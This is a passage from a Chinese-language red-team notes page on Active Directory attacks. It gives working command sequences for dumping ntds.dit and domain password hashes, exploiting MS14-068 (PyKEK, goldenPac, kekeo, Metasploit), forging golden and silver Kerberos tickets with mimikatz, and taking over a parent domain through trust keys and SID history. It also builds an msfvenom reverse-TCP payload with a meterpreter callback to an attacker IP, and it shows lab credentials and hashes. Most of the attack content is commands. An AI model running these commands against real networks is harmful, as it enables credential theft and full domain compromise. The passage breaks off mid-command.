href="https://gist.github.com/monoxgas/9d238accd969550136db">https://gist.github.com/monoxgas/9d238accd969550136db</a></p><pre class="line-numbers language-none"><code class="language-none">Import-Module .&#x2F;Invoke-DCSync.ps1Invoke-DCSync -PWDumpFormat<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="MSF-2"><a href="#MSF-2" class="headerlink" title="MSF"></a>MSF</h3><p>msf 里的 psexec_ntdsgrab 可以获取目标的 ntds.dit 和 SYSTEM 并将其保存到 /root/.msf4/loot/ 目录下 </p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrabset rhosts 192.168.7.7set smbdomain teamssix.comset smbuser administratorset smbpass 1qaz@WSXrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>除此之外，在获取到会话后，也可以直接用 MSF 提供的模块获取 ntds.dit</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;gather&#x2F;credentials&#x2F;domain_hashdumpset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注意生成的 payload 需要和目标系统位数一致，不然会报错</p></blockquote><h3 id="DSInternals"><a href="#DSInternals" class="headerlink" title="DSInternals"></a>DSInternals</h3><p>DSInternals 主要功能包括离线 ntds.dit 文件操作以及通过目录复制服务（DRS）远程协议查询域控制器。</p><p>DSInternals 下载地址：<a href="https://github.com/MichaelGrafnetter/DSInternals/releases">https://github.com/MichaelGrafnetter/DSInternals/releases</a></p><p>安装 DSInternals</p><pre class="line-numbers language-none"><code class="language-none">Install-Module DSInternals -Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接导出 hash，并保存在 output_hash.txt 文件里</p><pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system&#39;Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -Bootkey $key | Out-File output_hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>或者导出 hashcat 支持的 hash，并保存在 output_hashcat.txt 文件里</p><pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system.hive&#39;Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="vshaow-和-QuarksPwDump"><a href="#vshaow-和-QuarksPwDump" class="headerlink" title="vshaow 和 QuarksPwDump"></a>vshaow 和 QuarksPwDump</h3><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p><p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p><p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p><p>QuarksPwDump 下载地址：<a href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p><p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p><pre class="line-numbers language-none"><code class="language-none">setlocalif NOT &quot;%CALLBACK_SCRIPT%&quot;&#x3D;&#x3D;&quot;&quot; goto :IS_CALLBACKset SOURCE_DRIVE_LETTER&#x3D;%SystemDrive%set SOURCE_RELATIVE_PATH&#x3D;windows\ntds\ntds.ditset DESTINATION_PATH&#x3D;%~dp0@echo ...Determine the scripts to be executed&#x2F;generated...set CALLBACK_SCRIPT&#x3D;%~dpnx0set TEMP_GENERATED_SCRIPT&#x3D;GeneratedVarsTempScript.cmd@echo ...Creating the shadow copy...&quot;%~dp0vshadow.exe&quot; -script&#x3D;%TEMP_GENERATED_SCRIPT% -exec&#x3D;&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%del &#x2F;f %TEMP_GENERATED_SCRIPT%@goto :EOF:IS_CALLBACKsetlocal@echo ...Obtaining the shadow copy device name...call %TEMP_GENERATED_SCRIPT%@echo ...Copying from the shadow copy to the destination path...copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p><p>Windows SDK 下载安装完后，找到 vshadow.exe ，我这里的路径是：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\x64\vsstools\vshadow.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将这三个文件放到同一个文件夹里后，运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件</p><p>使用 esentutl 修复导出的 ntds.dit 文件</p><pre class="line-numbers language-none"><code class="language-none">esentutl &#x2F;p &#x2F;o ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后通过 QuarksPwDump.exe 导出域账号和散列值</p><pre class="line-numbers language-none"><code class="language-none">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 log 里就能看到导出的密码哈希了。</p><h1 id="0x27-Kerberos-域用户提权漏洞"><a href="#0x27-Kerberos-域用户提权漏洞" class="headerlink" title="0x27 Kerberos 域用户提权漏洞"></a>0x27 Kerberos 域用户提权漏洞</h1><h2 id="0、前言-7"><a href="#0、前言-7" class="headerlink" title="0、前言"></a>0、前言</h2><p>在 2014 年微软修复了 Kerberos 域用户提权漏洞，即 MS14-068，CVE 编号为 CVE-2014-6324，该漏洞影响了 Windows Server 2012 R2 以下的服务器，该漏洞允许 RT 将任意用户权限提升至域管级别。</p><p>不过从漏洞年代就知道这已经是个远古时代的漏洞，现实中已经很少会碰到了，这里就简单记录下，顺便熟悉熟悉工具的用法。</p><p>14-068 产生的原因主要在于用户可以利用伪造的票据向认证服务器发起请求，如果用户伪造域管的票据，服务端就会把拥有域管权限的服务票据返回回来。</p><h2 id="1、PyKEK"><a href="#1、PyKEK" class="headerlink" title="1、PyKEK"></a>1、PyKEK</h2><p>PyKEK 是一个利用 Kerberos 协议进行渗透的工具包，下载地址：<a href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p><p>使用 PyKEK 可以生成一个高权限的服务票据，之后通过 mimikatz 将服务票据导入到内存中。</p><p>MS 14-068 的补丁为：KB3011780，通过 wmic 查看补丁情况</p><pre class="line-numbers language-none"><code class="language-none">wmic qfe get hotfixid | findstr KB3011780<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前用户 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用 wmic </p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成高权限票据，-d 指定域控地址</p><pre class="line-numbers language-none"><code class="language-none">python2 ms14-068.py -u jack@0day.org -s S-1-5-21-1812960810-2335050734-3517558805-1133 -d 192.168.3.142 -p Aa123456<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>打开 mimikatz 清除当前内存中的票据信息</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将高权限票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptc &quot;TGT_jack@0day.org.ccache&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 net use 连接域控后，使用 psexec 获取 Shell</p><blockquote><p>这里 net ues 使用 IP 可能会失败，因此在此使用机器名进行连接 </p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231733653.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="2、GoldenPac"><a href="#2、GoldenPac" class="headerlink" title="2、GoldenPac"></a>2、GoldenPac</h2><p>goldenPac.py 是一个用于对 Kerberos 协议进行测试的工具，它集成在 impacket 工具包里。</p><p>Kali 在使用之前需要先安装 Kerberos 客户端</p><pre class="line-numbers language-none"><code class="language-none">apt-get install krb5-user -y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用 goldenPac.py 获取 Shell</p><pre class="line-numbers language-none"><code class="language-none">python3 goldenPac.py 0day.org&#x2F;jack:Aa123456@OWA2010SP3.0day.org<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>这里使用 IP 进行连接会连接不成功，只能使用主机名，因此可以在 hosts 文件中添加主机名对应的 IP</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109231746641.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>goldenPac.py 是通过 PsExec 获得 Shell 的，因此会产生大量的日志，而且现在这种连接方式也已经被各大杀软所拦截。</p><h2 id="3、kekeo"><a href="#3、kekeo" class="headerlink" title="3、kekeo"></a>3、kekeo</h2><p>kekeo 也是一个工具集，其中包含了 ms14-068 的利用模块，kekeo 下载地址：<a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><p>使用之前需要先清除票据</p><pre class="line-numbers language-none"><code class="language-none">klist purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后直接使用 kekeo 生成高权限票据</p><pre class="line-numbers language-none"><code class="language-none">kekeo.exe &quot;exploit::ms14068 &#x2F;domain:0day.org &#x2F;user:jack &#x2F;password:Aa123456 &#x2F;ptt&quot; &quot;exit&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以直接 dir 域控或者 PsExec 连接到域控了</p><h2 id="4、MSF"><a href="#4、MSF" class="headerlink" title="4、MSF"></a>4、MSF</h2><p>MSF 中也有 MS 14-086 的提权 EXP，不过需要结合 mimikatz 进行利用</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary&#x2F;admin&#x2F;kerberos&#x2F;ms14_068_kerberos_checksumset domain 0day.orgset password Aa123456set user jackset user_sid  S-1-5-21-1812960810-2335050734-3517558805-1133set rhosts OWA2010SP3.0day.orgrun<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>设置好域名、域控 IP、密码、用户、SID 后运行，将会获取一个 bin 文件</p><p>由于 MSF 里不支持 bin 文件的导入，因此需要 mimikatz 对其进行格式转换</p><pre class="line-numbers language-none"><code class="language-none">kerberos::clist &quot;20210923061821_default_192.168.3.142_windows.kerberos_484249.bin&quot; &#x2F;export<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后，生成一个木马</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;172.16.214.74 lport&#x3D;4444 -f exe &gt; shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将木马复制到目标主机上，并使其上线到 MSF</p><p>获得会话后，将刚才 mimikatz 转换后的 kirbi 文件导入到会话中</p><pre class="line-numbers language-none"><code class="language-none">load kiwikerberos_ticket_use &#x2F;tmp&#x2F;0-00000000-jack@krbtgt-0DAY.ORG.kirbibackground<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后使用 current_user_psexec 模块</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;local&#x2F;current_user_psexecset session 2set rhosts OWA2010SP3.0day.orgset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 172.16.214.74run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就会返回高权限的会话</p><blockquote><p>不过 MSF 在使用过程中报错了，网上一查发现别人也有这个错误，暂时还不清楚解决的方法</p></blockquote><h2 id="5、CS"><a href="#5、CS" class="headerlink" title="5、CS"></a>5、CS</h2><p>先利用前面的 ms14-068.py 生成一个 ccache 文件，之后使用 KrbCredExport 将 ccache 文件转为 kirbi 格式</p><p>KrbCredExport 下载地址：<a href="https://github.com/rvazarkar/KrbCredExport">https://github.com/rvazarkar/KrbCredExport</a></p><pre class="line-numbers language-none"><code class="language-none">python2 KrbCredExport.py TGT_jack@0day.org.ccache user.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接着使用 CS 的 kerberos_ticket_use 加载 ticket，之后就能访问到域控了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109240943968.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>此时想让域控上线自然也是没问题的了，可以先添加一个域控地址的 target，然后选择 PsExec ，勾选上 use session’s current access token 通过 jack 的会话上线即可。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109241000974.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x28-黄金票据"><a href="#0x28-黄金票据" class="headerlink" title="0x28 黄金票据"></a>0x28 黄金票据</h1><h2 id="0、前言-8"><a href="#0、前言-8" class="headerlink" title="0、前言"></a>0、前言</h2><p>RT 在利用黄金票据（Golden Ticket）进行 PTP 票据传递时，需要先知道以下信息：</p><ul><li>伪造的域管理员用户名</li><li>完整的域名</li><li>域 SID</li><li>krbtgt 的 NTLM Hash 或 AES-256 值</li></ul><p>其中 krbtgt 用户是域自带的用户，被 KDC 密钥分发中心服务所使用，属于 Domain Admins 组。</p><p>在域环境中，每个用户账号的票据都是由 krbtgt 用户所生成的，因此如果知道了 krbtgt 用户的 NTLM Hash 或者 AES-256 值，就可以伪造域内任意用户的身份了。</p><h2 id="1、导出-krbtgt-的-NTLM-Hash"><a href="#1、导出-krbtgt-的-NTLM-Hash" class="headerlink" title="1、导出 krbtgt 的 NTLM Hash"></a>1、导出 krbtgt 的 NTLM Hash</h2><p>在 mimikatz 下执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">lsadump::dcsync &#x2F;domain:teamssix.com &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 krbtgt 的 NTLM Hash 为 d685b9c4fa2d318a9943ed68948af087</p><p>该命令使用的 dcsync 功能远程转储 AD 里的 ntds.dit，使用 /user 参数，可以只导出指定用户的值。</p><p>或者使用以下命令获取 krbtgt 的 NTLM Hash ，域 SID 值，但该命令无法获取 AES-256 的值</p><pre class="line-numbers language-none"><code class="language-none">privilege::debuglsadump::lsa &#x2F;patch &#x2F;user:krbtgt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、获取基本信息"><a href="#2、获取基本信息" class="headerlink" title="2、获取基本信息"></a>2、获取基本信息</h2><p>获取域 SID</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get name,sid<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这里得到 administrator 的 SID 为  S-1-5-21-284927032-1122706408-2778656994-500，即表示当前域的 SID 就是 S-1-5-21-284927032-1122706408-2778656994</p><p>获取当前用户的 SID</p><pre class="line-numbers language-none"><code class="language-none">whoami &#x2F;user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域管理员账号</p><pre class="line-numbers language-none"><code class="language-none">net group &quot;domain admins&quot; &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查询域名</p><pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3、制作黄金票据"><a href="#3、制作黄金票据" class="headerlink" title="3、制作黄金票据"></a>3、制作黄金票据</h2><p>先将票据清空</p><pre class="line-numbers language-none"><code class="language-none">kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;krbtgt:d685b9c4fa2d318a9943ed68948af087 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>传递票据并注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos::ptt Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4、验证权限"><a href="#4、验证权限" class="headerlink" title="4、验证权限"></a>4、验证权限</h2><p>退出 mimikatz ，使用 dir 发现可以成功列出域控文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109271559013.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>这里使用 PsExec 也同样是能获取到权限的，除了上面使用 NTLM Hash 之外，还可以使用 krbtgt 的 AES-256 值生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">kerberos::golden &#x2F;admin:Administrator &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;aes256:3dfa1f9b5809250a7670c12d1e109f0acb9660f902da8aa3a4be55a16affbbd5 &#x2F;ticket:Administrator.kiribi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>命令完成之后，也会生成一个 Administrator.kiribi 文件，之后的操作就都一样了。</p><h2 id="5、MSF-下的利用"><a href="#5、MSF-下的利用" class="headerlink" title="5、MSF 下的利用"></a>5、MSF 下的利用</h2><p>首先上线一个普通用户，然后加载 kiwi 模块</p><pre class="line-numbers language-none"><code class="language-none">load kiwi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成黄金票据</p><pre class="line-numbers language-none"><code class="language-none">golden_ticket_create -d teamssix.com -k d685b9c4fa2d318a9943ed68948af087 -s S-1-5-21-284927032-1122706408-2778656994 -u administrator -t &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将黄金票据注入内存</p><pre class="line-numbers language-none"><code class="language-none">kerberos_ticket_use &#x2F;root&#x2F;administrator.ticket<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注入成功后，进入 Shell 就能查看 dc 里的文件了</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202109271628454.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x29-白银票据"><a href="#0x29-白银票据" class="headerlink" title="0x29 白银票据"></a>0x29 白银票据</h1><h2 id="0、前言-9"><a href="#0、前言-9" class="headerlink" title="0、前言"></a>0、前言</h2><p>白银票据（Sliver Ticket） 不同于黄金票据（Golden Ticket）</p><blockquote><p>Kerberos 协议详解：<a href="https://teamssix.com/210923-151418.html">https://teamssix.com/210923-151418.html</a></p></blockquote><p>白银票据不与密钥分发中心 KDC 交互，因此没有了 Kerberos 认证协议里的前 4 步，通过伪造的票据授予服务 TGS 生成伪造的服务票据  ST 直接与服务器 Server 进行交互。</p><p>白银票据与黄金票据的区别：</p><p>1、白银票据不经过 KDC，因此白银票据日志相对于黄金票据会更少，同时白银票据的日志都在目标服务器上，域控上不会有日志</p><p>2、白银票据利用服务账户的哈希值，不同于黄金票据利用 krbtgt 账户的哈希值，因此白银票据更加隐蔽，但白银票据的权限就远不如黄金票据的权限了</p><p>想利用白银票据需要先知道以下信息：</p><ul><li>域名</li><li>域 SID</li><li>目标服务器的 FQDN 即完整的域名</li><li>可利用的服务</li><li>服务账户的 NTLM 哈希</li><li>伪造的用户名即任意用户名</li></ul><h2 id="1、伪造-CIFS-服务权限"><a href="#1、伪造-CIFS-服务权限" class="headerlink" title="1、伪造 CIFS 服务权限"></a>1、伪造 CIFS 服务权限</h2><p>CIFS 服务常用于 Windows 主机之间的文件共享，首先使用 mimikatz 获取服务账户的 NTLM 哈希，这里使用的 Username 为 DC$ 的 NTLM 哈希</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe log &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到 HASH 后，清空当前系统中的票据，防止其他票据干扰</p><pre class="line-numbers language-none"><code class="language-none">klist purge# 或者在 mimikatz 里清除kerberos::purge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 mimikatz 生成伪造的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:cifs &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre><code>![](https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091330529.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10)</code></pre><p>在伪造票据后，使用 dir 命令就能读取到目标的共享服务了。</p><h2 id="2、伪造-LDAP-服务权限"><a href="#2、伪造-LDAP-服务权限" class="headerlink" title="2、伪造 LDAP 服务权限"></a>2、伪造 LDAP 服务权限</h2><p>首先判断当前权限是否可以使用 dcsync 域控进行同步</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;lsadump::dcsync &#x2F;dc:dc &#x2F;domain:teamssix.com &#x2F;user:krbtgt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果返回 ERROR 说明当前权限不能进行 dcsync 操作</p><p>接下来生成 LDAP 服务的白银票据</p><pre class="line-numbers language-none"><code class="language-none">.\mimikatz.exe &quot;kerberos::golden &#x2F;user:t &#x2F;domain:teamssix.com &#x2F;sid:S-1-5-21-284927032-1122706408-2778656994 &#x2F;target:dc &#x2F;rc4:ef9e49a41feaa171f642016fd4cb7e7a &#x2F;service:ldap &#x2F;ptt&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110091403286.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x30-跨域安全"><a href="#0x30-跨域安全" class="headerlink" title="0x30 跨域安全"></a>0x30 跨域安全</h1><h2 id="0、前言-10"><a href="#0、前言-10" class="headerlink" title="0、前言"></a>0、前言</h2><p>常见的跨域攻击方法有以下几种：</p><p>i、利用常规的渗透方法，比如 Web 漏洞</p><p>ii、利用已知散列值进行哈希传递或票据传递，因为有可能域内的密码是通用的</p><p>iii、利用域信任关系</p><p>这里主要看第三种：域信任关系</p><p>当有多个域时，不同的域之间想进行资源共享，就需要用到域信任，只有当域之间互相信任后，才能进行资源共享。</p><p>域信任关系可分为单向信任和双向信任。单向信任即 A 信任 B，但 B 不信任 A，双向信任同理。在创建子域时，系统会在新的子域和父域之间自动创建双向可传递信任关系。</p><p>域信任关系又可分为内部信任和外部信任。内部信任是指在同一个林中域之间的信任关系，这种信任关系是可传递的；外部信任指不同林之间域的信任关系，这种信任关系要视林间信任类型来判断是不是可传递。</p><p>在 Windows 操作系统中，只有 Domain Admins 组中的用户可以管理域信任关系；Enterprise Admins 组（仅出现在林的根域中）的成员对林中所有域拥有完全控制权限，默认情况下，该组包含林中所有域控上具有 administrators 权限的成员。</p><h2 id="1、获取域信息"><a href="#1、获取域信息" class="headerlink" title="1、获取域信息"></a>1、获取域信息</h2><p>这里使用工具 lg 进行域内信息的收集，lg 是一款用 C++ 编写的用于管理本地用户组和域本地用户组的命令行工具，可用它来收集远程主机用户和组的信息。</p><p>枚举 teamssix 域中的用户组</p><pre class="line-numbers language-none"><code class="language-none">lg.exe teamssix\.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程计算机的用户组，如果提示拒绝访问，说明没有信任关系</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程计算机的用户名</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程系统中全部用户的 SID</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>枚举远程系统指定组中的所有成员的 SID</p><pre class="line-numbers language-none"><code class="language-none">lg.exe \\dc\administrators -lu -sidsout<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、利用域信任密钥获取目标域权限"><a href="#2、利用域信任密钥获取目标域权限" class="headerlink" title="2、利用域信任密钥获取目标域权限"></a>2、利用域信任密钥获取目标域权限</h2><p>这里环境信息为：</p><p>父域的域控：dc.teamssix.com</p><p>子域的域控：subdc.sub.teamssix.com</p><p>子域内的计算机：user4.sub.teamssix.com</p><p>子域内的普通用户：user4</p><p>在子域的域控中使用 mimikatz 获取需要的信息</p><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:administrator&quot; &quot;lsadump::trust &#x2F;patch&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到当前域的 SID 、父域的 SID 和子域域管 NTLM 哈希后，在子域的普通用户机器上利用 mimikatz 制作信任票据</p><blockquote><p>这里的 sids 是父域的 sid，sids 后的 519 表示创建的用户属于父域的管理员组</p></blockquote><pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;kerberos::golden &#x2F;domain:sub.teamssix.com &#x2F;sid:S-1-5-21-1655164184-1934932396-2547489287 &#x2F;sids:S-1-5-21-2230503874-1187844892-774991719-519 &#x2F;rc4:5bfd59b5e1f78a794f714af07eac869f &#x2F;user:administrator &#x2F;service:krbtgt &#x2F;target:teamssix.com &#x2F;ticket:subdc_administrator.kirbi&quot; exit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 利用刚刚制作的信任票据获取目标域中目标服务的 TGS 并保存到文件中</p><pre class="line-numbers language-none"><code class="language-none">asktgs subdc_administrator.kirbi cifs&#x2F;dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将获取的 TGS 票据注入到内存中</p><pre class="line-numbers language-none"><code class="language-none">kirbikator lsa cifs.dc.teamssix.com.kirbi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 dir 访问目标域控</p><pre class="line-numbers language-none"><code class="language-none">dir \\dc.teamssix.com\c$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/202110211307519.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、利用-krbtgt-散列值获取目标域的权限"><a href="#3、利用-krbtgt-散列值获取目标域的权限" class="headerlink" title="3、利用 krbtgt 散列值获取目标域的权限"></a>3、利用 krbtgt 散列值获取目标域的权限</h2><p>如果攻击者获取了林内任意域的 krbtgt 散列值，就可以使用 sidHistory 获得该林的完整权限。</p><p>首先获取当前子域和父域的 SID 值，可以使用以下工具或命令</p><pre class="line-numbers language-none"><code class="language-none">wmic useraccount get caption,sidwhoami &#x2F;useradfind.exe -sc u:user4 | findstr SidGet-DomainSID sub.teamssix.com  # PowerView 里的命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来获取子域的 krbtgt 的哈希值，使用 mimikatz 即可</p><pre class="line-numbers language-none"><code class="language-none">mimikatz privilege::debug &quot;lsadump::lsa &#x2F;patch &#x2F;user:krbtgt&quot; sekurlsa::krbtgt exit<span 